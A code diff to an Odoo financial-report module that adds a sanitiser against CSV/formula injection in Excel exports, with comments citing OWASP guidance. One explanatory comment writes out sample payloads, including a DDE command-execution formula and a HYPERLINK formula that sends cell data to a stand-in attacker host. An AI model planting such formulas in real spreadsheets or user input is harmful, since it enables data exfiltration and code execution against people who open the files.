@@ -33,6 +33,68 @@ from openpyxl.utils import get_column_letter
 from odoo import _, api, fields, models
 from odoo.exceptions import UserError
 
+# ---------------------------------------------------------------------------
+# CSV / Formula Injection — Excel cell sanitisation helper
+# (CP10 Issue #4 — MAJOR, Security / Output Encoding).
+# ---------------------------------------------------------------------------
+# OWASP reference: https://owasp.org/www-community/attacks/CSV_Injection
+#
+# When user-controllable text flows into a spreadsheet cell without
+# sanitisation, and the cell value begins with any of the characters
+# ``=``, ``+``, ``-``, ``@``, TAB (``\t``), or CR (``\r``), Microsoft
+# Excel and LibreOffice Calc interpret the cell as a formula when the
+# workbook is opened.  Attacker-controlled:
+#
+#   * ``res.partner.display_name`` (partner / customer / vendor name)
+#   * ``account.move.line.name`` (journal entry description)
+#   * ``account.move.line.ref`` (user-supplied reference)
+#   * ``account.account.name`` (chart-of-accounts display name)
+#   * ``res.company.name`` (company display name, emitted on the
+#     Report Parameters sheet)
+#
+# can therefore:
+#
+#   * invoke DDE / ``=cmd|'/c calc'!A0`` on Excel (RCE on DDE-enabled hosts)
+#   * exfiltrate data via ``=HYPERLINK("http://attacker/?d="&A1,...)``
+#   * pull remote content via ``=IMPORTRANGE(...)`` on Google Sheets
+#
+# The industry-standard mitigation (OWASP, 2014 Dan Sharp writeup,
+# Synopsys, Snyk) is to prefix any cell whose first character is in the
+# dangerous-prefix set with an ASCII apostrophe (``'``).  Spreadsheet
+# applications treat a leading apostrophe as a text indicator: the
+# apostrophe is displayed in the formula bar but NOT in the cell body,
+# so the intended text is preserved for human readers while formula
+# interpretation is neutralised.
+#
+# The helper is module-level (not a method) because it has no ``self``
+# dependency and is invoked on every cell write.  It is a pure function
+# ``(value) -> value`` safe to call in tight loops.  Non-string values
+# (int, float, datetime) are returned unchanged — they cannot carry a
+# leading formula trigger — so numeric columns remain native numbers
+# and continue to be formatted by openpyxl's ``monetary_fmt`` /
+# ``percentage_fmt`` number-format strings.
+_XLSX_FORMULA_PREFIXES = ('=', '+', '-', '@', '\t', '\r')
+
+
+def _sanitize_xlsx_cell(value):
+    """Neutralise CSV / formula-injection payloads before writing a cell.
+
+    Returns a value that is safe to pass to
+    ``openpyxl.worksheet.worksheet.Worksheet.cell(value=...)`` even when
+    the original came from an attacker-controlled text field.
+
+    :param value: The value that would be written to a cell.  May be any
+        Python scalar — only ``str`` values are inspected; all other
+        types (int, float, bool, datetime, None) are returned unchanged.
+    :returns: The original value if it is not a string or does not start
+        with a formula-triggering character; otherwise the same string
+        with an ASCII apostrophe prefix.
+    :rtype: Same as input (``str`` on the sanitised branch).
+    """
+    if isinstance(value, str) and value.startswith(_XLSX_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
 
 class FinancialReportAbstract(models.AbstractModel):
     """
@@ -642,21 +704,43 @@ class FinancialReportAbstract(models.AbstractModel):
         percentage_fmt = '0.00"%"'
 
         # -- Column widths and headers (row 1) --
+        # CP10 Issue #4 (MAJOR): column headers are typically localised
+        # literal strings, but applying the sanitiser here is defensive —
+        # if a subclass ever returns a header derived from user input
+        # (e.g. a dynamic comparison-period header including a custom
+        # company label), injection remains blocked.
         for col_idx, col_def in enumerate(columns, start=1):
-            cell = ws.cell(row=1, column=col_idx, value=col_def['header'])
+            header_value = _sanitize_xlsx_cell(col_def['header'])
+            cell = ws.cell(row=1, column=col_idx, value=header_value)
             cell.font = header_font
             cell.alignment = Alignment(horizontal='center', wrap_text=True)
             col_letter = get_column_letter(col_idx)
             ws.column_dimensions[col_letter].width = col_def.get('width', 15)
 
         # -- Data rows (row 2 onwards) --
+        # CP10 Issue #4 (MAJOR, PRIMARY sink): ``row_data`` originates in
+        # each report subclass's ``_get_xlsx_data`` and routinely includes
+        # user-controllable strings — ``partner_id.display_name``,
+        # ``move_line.name`` (journal entry description),
+        # ``move_line.ref`` (user-supplied reference), and
+        # ``account.account.name``.  Any of these can carry a formula
+        # prefix and trigger Excel / LibreOffice / Google Sheets formula
+        # execution on open.  ``_sanitize_xlsx_cell`` neutralises the
+        # attack while preserving the original display text.  Native
+        # int / float values used for monetary and percentage columns
+        # flow through unchanged so openpyxl's number-format styling
+        # continues to apply at lines below.
         for row_idx, row_data in enumerate(data_rows, start=2):
             level = row_data.get('level', 0)
             is_total = row_data.get('is_total', False)
 
             for col_idx, col_def in enumerate(columns, start=1):
                 value = row_data.get(col_def['field'], '')
-                cell = ws.cell(row=row_idx, column=col_idx, value=value)
+                cell = ws.cell(
+                    row=row_idx,
+                    column=col_idx,
+                    value=_sanitize_xlsx_cell(value),
+                )
 
                 # Apply bold font for total lines
                 if is_total:
@@ -666,7 +750,12 @@ class FinancialReportAbstract(models.AbstractModel):
                 if col_def['field'] == 'name' and level > 0:
                     cell.alignment = Alignment(indent=level * 2)
 
-                # Number formatting based on column style
+                # Number formatting based on column style.  Note: the
+                # ``isinstance`` check on the ORIGINAL ``value`` is
+                # intentional — the sanitiser only transforms strings
+                # (monetary / percentage cells are native numerics and
+                # are never rewritten), so the style branch remains
+                # correct regardless of sanitisation.
                 col_style = col_def.get('style', 'text')
                 if col_style == 'monetary' and isinstance(value, (int, float)):
                     cell.number_format = monetary_fmt
@@ -691,10 +780,21 @@ class FinancialReportAbstract(models.AbstractModel):
                 (_('Comparison From'), str(self.comparison_date_from) if self.comparison_date_from else _('N/A')),
                 (_('Comparison To'), str(self.comparison_date_to) if self.comparison_date_to else _('N/A')),
             ])
+        # CP10 Issue #4 (MAJOR, DEFENSIVE sink): the Report Parameters
+        # sheet includes ``self.company_id.name`` — a user-writable
+        # ``res.company.name`` Char field.  Apply the sanitiser to both
+        # columns so a malicious company label cannot inject a formula
+        # into the audit-trace metadata sheet.  ``label`` values are
+        # localised literals and always safe, but the defensive call
+        # keeps the write path uniform.
         for r_idx, (label, value) in enumerate(param_rows, start=1):
-            label_cell = info_ws.cell(row=r_idx, column=1, value=label)
+            label_cell = info_ws.cell(
+                row=r_idx, column=1, value=_sanitize_xlsx_cell(label),
+            )
             label_cell.font = info_font
-            info_ws.cell(row=r_idx, column=2, value=value)
+            info_ws.cell(
+                row=r_idx, column=2, value=_sanitize_xlsx_cell(value),
+            )
         info_ws.column_dimensions['A'].width = 25
         info_ws.column_dimensions['B'].width = 35
 
